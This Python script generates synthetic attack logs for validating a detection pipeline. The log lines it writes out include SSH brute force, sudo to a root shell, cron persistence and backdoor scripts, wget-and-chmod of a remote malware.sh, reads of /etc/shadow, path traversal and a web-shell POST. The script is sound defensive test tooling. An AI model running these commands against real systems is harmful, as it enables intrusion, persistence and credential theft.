"""
Generate a synthetic multi-stage attack auth.log for pipeline validation.

Attack stages simulated:
  1. Brute Force        (T1110)     — 15 failed logins over 10 minutes
  2. Initial Access     (T1078)     — successful login as 'admin'
  3. Privilege Escalation (T1548)   — sudo -i to root
  4. Persistence        (T1053.003) — crontab edit
  5. Exfiltration       (T1105)     — wget + chmod

Usage:
    py src/generate_lab.py [output_path]
"""

import sys
from datetime import datetime, timedelta
from pathlib import Path


def generate_lab(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
    victim_user: str = 'admin',
    target_host: str = 'server1',
) -> Path:
    """Write a realistic simulated attack auth.log and return its path."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_attack.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 23, 9, 45, 0)
    sshd_base_pid = 4000
    sudo_base_pid = 4100
    t = base
    lines = []

    def ts(dt: datetime) -> str:
        return dt.strftime('%b %d %H:%M:%S')

    # ── Stage 1: Brute Force (15 failed logins, ~40s apart) ───────────────────
    for i in range(15):
        t += timedelta(seconds=40)
        pid = sshd_base_pid + i
        lines.append(
            f"{ts(t)} {target_host} sshd[{pid}]: "
            f"Failed password for root from {attacker_ip} port {22000 + i} ssh2"
        )

    # ── Stage 2: Initial Access ────────────────────────────────────────────────
    t += timedelta(seconds=30)
    access_pid = sshd_base_pid + 15
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid}]: "
        f"Accepted password for {victim_user} from {attacker_ip} port 23000 ssh2"
    )
    t += timedelta(seconds=2)
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid}]: "
        f"pam_unix(sshd:session): session opened for user {victim_user} by (uid=0)"
    )

    # ── Stage 3: Privilege Escalation (sudo -i) ────────────────────────────────
    t += timedelta(seconds=15)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/home/{victim_user} ; USER=root ; "
        f"COMMAND=/bin/bash -i"
    )
    t += timedelta(seconds=3)
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid + 1}]: "
        f"pam_unix(sshd:session): session opened for user root by {victim_user}(uid=1001)"
    )

    # ── Stage 4: Persistence (crontab edit) ────────────────────────────────────
    t += timedelta(seconds=20)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid + 1}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/root ; USER=root ; "
        f"COMMAND=/usr/bin/crontab -e"
    )

    # ── Stage 5: Exfiltration (wget + chmod) ──────────────────────────────────
    t += timedelta(seconds=10)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid + 2}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/root ; USER=root ; "
        f"COMMAND=/usr/bin/wget http://192.168.99.2/exfil.sh -O /tmp/exfil.sh"
    )
    t += timedelta(seconds=5)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid + 3}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/root ; USER=root ; "
        f"COMMAND=/bin/chmod +x /tmp/exfil.sh"
    )

    # ── Session close ──────────────────────────────────────────────────────────
    t += timedelta(seconds=30)
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid}]: "
        f"pam_unix(sshd:session): session closed for user {victim_user}"
    )

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_syslog_lab(
    output_path: Path | None = None,
    target_host: str = 'server1',
) -> Path:
    """Write a synthetic syslog with persistence indicators."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_syslog.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 24, 9, 0, 0)

    def ts(dt: datetime) -> str:
        return dt.strftime('%b %d %H:%M:%S')

    lines = [
        f"{ts(base)}              {target_host} systemd[1]: Started nginx.service.",
        f"{ts(base + timedelta(minutes=15))} {target_host} systemd[1]: Started ssh.service.",
        f"{ts(base + timedelta(minutes=30))} {target_host} CRON[2345]: (root) CMD (/etc/cron.d/persist.sh)",
        f"{ts(base + timedelta(minutes=31))} {target_host} CRON[2346]: (admin) CMD (/home/admin/.backdoor.sh)",
        f"{ts(base + timedelta(minutes=45))} {target_host} kernel[0]: Out of memory: Kill process 3456 (apache2) score 500 or sacrifice child",
        f"{ts(base + timedelta(minutes=50))} {target_host} kernel[0]: usb 1-1: new full-speed USB device number 2 using xhci_hcd",
        f"{ts(base + timedelta(minutes=55))} {target_host} systemd[1]: persist.service: Failed with result 'exit-code'.",
        f"{ts(base + timedelta(hours=1))}    {target_host} systemd[1]: Stopped apache2.service.",
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_audit_lab(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
    victim_user: str = 'admin',
) -> Path:
    """Write a synthetic auditd log covering login → exec → shell."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_audit.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base_epoch = 1714000000.0

    def audit_ts(offset: float) -> str:
        return f"{base_epoch + offset:.3f}"

    lines = [
        # Auth failure then successful login
        f'type=USER_AUTH msg=audit({audit_ts(0)}:100): pid=1234 uid=0 auid=4294967295 ses=4294967295 msg=\'op=PAM:authentication acct="{victim_user}" exe="/usr/sbin/sshd" hostname={attacker_ip} addr={attacker_ip} terminal=ssh res=failed\'',
        f'type=USER_LOGIN msg=audit({audit_ts(60)}:101): pid=1235 uid=0 auid=4294967295 ses=1 msg=\'op=login acct="{victim_user}" exe="/usr/sbin/sshd" hostname={attacker_ip} addr={attacker_ip} terminal=ssh res=success\'',
        # Process execution: wget and chmod (post-exploitation)
        f'type=EXECVE msg=audit({audit_ts(90)}:102): argc=3 a0="wget" a1="-q" a2="http://192.168.99.2/malware.sh"',
        f'type=EXECVE msg=audit({audit_ts(100)}:103): argc=3 a0="chmod" a1="+x" a2="/tmp/malware.sh"',
        # Shell spawned
        f'type=SYSCALL msg=audit({audit_ts(110)}:104): arch=c000003e syscall=59 success=yes exit=0 ppid=1235 pid=5678 auid=1001 uid=0 euid=0 comm="bash" exe="/bin/bash" key="shell_exec"',
        # Credential file access
        f'type=OPEN msg=audit({audit_ts(120)}:105): arch=c000003e syscall=2 success=yes exit=3 a0=ffffff9c a1=7f... a2=0 a3=0 ppid=5678 pid=5679 auid=1001 uid=0 name="/etc/shadow" dev=fd:01 ino=12345',
        # Another auth failure
        f'type=USER_AUTH msg=audit({audit_ts(180)}:106): pid=2345 uid=0 auid=4294967295 ses=4294967295 msg=\'op=PAM:authentication acct="root" exe="/usr/sbin/su" hostname=? addr=? terminal=pts/0 res=failed\'',
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_web_lab(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
) -> Path:
    """Write a synthetic nginx/apache combined access log with attack patterns."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_web.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 24, 10, 0, 0)

    def wts(dt: datetime) -> str:
        return dt.strftime('%d/%b/%Y:%H:%M:%S +0000')

    a = attacker_ip
    lines = [
        # Normal request
        f'10.0.0.5 - - [{wts(base)}] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0)"',
        # Tool fingerprint (sqlmap)
        f'{a} - - [{wts(base + timedelta(seconds=1))}] "GET /login?id=1 HTTP/1.1" 200 512 "-" "sqlmap/1.4.7#stable (https://sqlmap.org)"',
        # Path traversal attack
        f'{a} - - [{wts(base + timedelta(seconds=2))}] "GET /../../etc/passwd HTTP/1.1" 404 256 "-" "curl/7.68.0"',
        # Admin access
        f'{a} - - [{wts(base + timedelta(seconds=3))}] "GET /admin HTTP/1.1" 200 2048 "-" "Mozilla/5.0"',
        # Web shell (POST to .php returning 200)
        f'{a} - - [{wts(base + timedelta(seconds=4))}] "POST /uploads/shell.php HTTP/1.1" 200 128 "-" "python-requests/2.25.1"',
        # Scanning (5+ 404s from same IP with nikto UA)
        f'{a} - - [{wts(base + timedelta(seconds=5))}] "GET /backup HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=6))}] "GET /config.php HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=7))}] "GET /.env HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=8))}] "GET /wp-login.php HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=9))}] "GET /phpmyadmin HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


if __name__ == '__main__':
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else None
    path = generate_lab(out)
    print(f"Lab log written to: {path}  ({len(path.read_text().splitlines())} lines)")
    for fn, name in [(generate_syslog_lab, 'syslog'), (generate_audit_lab, 'audit'), (generate_web_lab, 'web')]:
        p = fn()
        print(f"{name} lab log: {p}  ({len(p.read_text().splitlines())} lines)")
